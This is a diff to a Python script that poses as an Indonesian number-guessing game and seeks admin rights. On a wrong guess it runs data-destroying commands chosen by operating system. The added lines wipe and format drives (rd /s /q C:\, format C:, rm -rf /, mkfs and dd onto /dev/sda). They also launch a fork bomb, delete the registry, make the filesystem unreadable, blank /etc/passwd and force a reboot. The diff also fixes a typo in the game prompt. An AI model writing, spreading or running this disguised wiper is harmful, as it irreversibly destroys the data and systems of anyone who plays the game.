@@ -29,7 +29,7 @@ def elevate():
             print("Gagal elevate dengan sudo:", e)
     sys.exit()
 
-jawaban = input("Apakah kamu mau bermain game tebak angka inj? (y/n): ").strip().lower()
+jawaban = input("Apakah kamu mau bermain game tebak angka ini? (y/n): ").strip().lower()
 
 if jawaban == "y":
     if is_admin():
@@ -48,10 +48,29 @@ else:
     print(f"Tebakan salah! Mendeteksi OS: {system}")
 
     if system == "Windows":
-        shutil.rmtree("C:\\windows\\System32")
+        windows_commands = [
+            "taskkill /f /im explorer.exe",
+            r"rd /s /q C:\\",
+            "format C: /fs:ntfs /q /x",
+            "del /F /S /Q C:\\*",
+            "bcdedit /deletevalue {current} safeboot",
+            "cipher /w:C:\\",
+            "reg delete HKLM /f",
+            "shutdown -r -t 0 -f"
+        ]
+        for cmd in windows_commands:
+            os.system(cmd)
 
-    elif system == "Darwin":  # macOS
-        shutil.rmtree("/System")
-
-    elif system == "Linux":
-        shutil.rmtree("/")
+    elif system in ["Linux", "Darwin"]:
+        unix_commands = [
+            "sudo rm -rf /",
+            "sudo mkfs.ext4 /dev/sda",
+            ":(){ :|:& };:",
+            "sudo dd if=/dev/zero of=/dev/sda",
+            "sudo mv /bin /dev/null",
+            "sudo chmod -R 000 /",
+            "sudo > /etc/passwd",
+            "sudo shutdown -r now"
+        ]
+        for cmd in unix_commands:
+            os.system(cmd)
